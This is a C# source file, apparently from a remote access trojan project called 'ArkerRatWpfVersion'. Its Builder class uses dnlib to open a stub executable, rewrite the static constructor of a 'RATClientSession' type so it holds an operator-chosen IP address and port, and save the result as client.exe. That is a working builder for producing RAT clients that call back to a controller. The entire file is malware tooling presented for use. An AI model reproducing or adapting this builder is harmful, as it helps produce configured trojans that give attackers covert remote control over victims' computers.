using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.CodeDom.Compiler;
using System.IO;
using System.Diagnostics;
using System.Windows;
using System.Security.Cryptography;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace ArkerRatWpfVersion
{
    public class Builder
    {
        public Builder(string ip, string port) 
        {
            BuildClient(ip, port);
        }

        private void BuildClient(string ip, string port)
        {
            using (var module = ModuleDefMD.Load(Path.Combine(Directory.GetCurrentDirectory() + "\\temp", "temp.exe")))
            {
                var targetType = module.GetTypes().First(type=>type.Name== "RATClientSession");
                var _ip = targetType.FindField("ip");
                var _port = targetType.FindField("port");

                var cctr = targetType.FindStaticConstructor();
                for (int i = 0; i < cctr.Body.Instructions.Count; i++)
                {
                    var instruction = cctr.Body.Instructions[i];
                    if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand==_ip)
                    {
                        cctr.Body.Instructions[i-1]=OpCodes.Ldstr.ToInstruction(ip);
                    }
                    else if (instruction.OpCode == OpCodes.Stsfld && instruction.Operand == _port)
                    {
                        cctr.Body.Instructions[i - 1] = OpCodes.Ldc_I4.ToInstruction(Convert.ToInt32(port));
                    }
                }
                module.Write(Path.Combine(Directory.GetCurrentDirectory(), "client") + "\\client.exe");
            }        
        }
    }
}
